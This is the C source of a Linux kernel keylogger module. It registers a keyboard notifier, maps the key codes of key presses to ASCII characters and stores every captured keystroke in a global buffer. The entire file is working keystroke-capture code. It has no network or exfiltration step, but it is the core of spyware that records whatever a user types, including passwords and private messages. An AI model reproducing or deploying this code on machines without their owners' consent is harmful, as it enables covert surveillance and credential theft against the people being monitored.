#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>
#include "keylogger.h"

char keystrokes[BUFFER_SIZE];
static char *pkeystrokes;

struct notifier_block nb = {
	.notifier_call = keylogger_notifier
};

// table for easily converting key codes to ascii
#define SPACE_KEY_CODE	0x39
#define FIRST_KEY_CODE	0x2
#define LAST_KEY_CODE	0x35
const char character_table[] = {
	'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\0', '\t',
	'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n', '\n',
	'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '\n', '\n', '\\',
	'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'
};

static void add_keycode(int key_code);

void init_keylogger(void) {
	memset(keystrokes, 0, sizeof(keystrokes));
	pkeystrokes = keystrokes;

	// register the keyboard notifier, for keyboard interrupts
	register_keyboard_notifier(&nb);
	return;
}

void exit_keylogger(void) {
	unregister_keyboard_notifier(&nb);
	return;
}

// this will be called when there are new keyboard events
int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *data) {
	struct keyboard_notifier_param *param = (struct keyboard_notifier_param *) data;
	int key_code;

	// check if the event is a key press and if it is down
	if (action == KBD_KEYCODE && param->down == 1) {
		// get the key code of the key pressed
		key_code = param->value;
		add_keycode(key_code);
	}

	return NOTIFY_OK;
}

// take a key code and add it to the keylog keystrokes
static void add_keycode(int key_code) {
	char ascii = '\0';
	if (key_code >= FIRST_KEY_CODE && key_code <= LAST_KEY_CODE) {
		ascii = character_table[key_code - FIRST_KEY_CODE];
	} else if (key_code == SPACE_KEY_CODE) {
		ascii = ' ';
	}

	if (ascii && pkeystrokes < keystrokes + sizeof(char)*BUFFER_SIZE) {
		*(pkeystrokes++) = ascii;
	}
	return;
}

